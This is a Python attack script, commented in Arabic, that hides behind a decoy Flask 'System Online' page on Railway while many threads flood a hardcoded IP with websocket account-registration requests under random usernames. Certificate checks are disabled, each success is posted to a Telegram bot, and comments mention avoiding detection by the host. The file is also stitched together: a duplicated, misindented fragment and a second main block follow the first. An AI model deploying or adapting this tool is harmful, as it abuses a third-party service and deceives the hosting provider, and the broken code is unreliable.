import os
import threading
from flask import Flask
from ssl import CERT_NONE
from gzip import decompress
from random import choice, choices
from concurrent.futures import ThreadPoolExecutor
from json import dumps
import requests
import time

# --- إعدادات الخادم الوهمي لإرضاء Railway ---
app = Flask(__name__)
@app.route('/')
def home():
    return "System Online"

# --- إعدادات سحب البيانات من بيئة Railway ---
TOKEN = os.getenv("BOT_TOKEN")
ID = os.getenv("CHAT_ID")

try:
    from websocket import create_connection
except:
    os.system('pip install websocket-client')
    from websocket import create_connection

def attack_logic():
    while True:
        user = choice('qwertyuioplkjhgfdsazxcvbnm') + ''.join(choices(list('qwertyuioplkjhgfdsazxcvbnm1234567890'), k=12))
        try:
            ws = create_connection("wss://193.200.173.45/Auth", sslopt={"cert_reqs": CERT_NONE}, timeout=15)
            payload = {
                "action": "Register",
                "subaction": "Desktop",
                "login": str(user),
                "password": {"m1x": "503c73d12b354f86ff9706b2114704380876f59f1444133e62ca27b5ee8127cc", "m2": "219d1d9b049550f26a6c7b7914a44da1b5c931eff8692dbfe3127eeb1a922fcf"},
                "devicename": "Railway_V99_Worker",
                "softwareversion": "1.1.0.1380",
                "os": "AND"
            }
            ws.send(dumps(payload))
            response = decompress(ws.recv()).decode('utf-8')
            if '"status":"Success"' in response:
                requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={"chat_id": ID, "text": f"✅ Hit!\nUser: {user}\nPass: hhhh"})
            ws.close()
        except:
            time.sleep(1)

def start_attack():
    with ThreadPoolExecutor(max_workers=20) as executor: # تقليل الخيوط لضمان استقرار الخادم الوهمي
        for _ in range(20):
            executor.submit(attack_logic)

if __name__ == "__main__":
    # تشغيل الهجوم في خيط منفصل
    threading.Thread(target=start_attack, daemon=True).start()
    # تشغيل الخادم الوهمي على المنفذ الذي يطلبه Railway
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
            if '"status":"Success"' in response:
                msg = f"✅ Hit on Railway!\nUser: {user}\nPass: hhhh"
                requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={"chat_id": ID, "text": msg})
            ws.close()
        except:
            time.sleep(1) # تأخير بسيط لتجنب كشف الاستضافة

if __name__ == "__main__":
    print("🔥 ARCHITECT RAILWAY WORKER IS LIVE...")
    with ThreadPoolExecutor(max_workers=50) as executor: # Railway يفضل عدد خيوط أقل للاستقرار
        for _ in range(50):
            executor.submit(attack_logic)
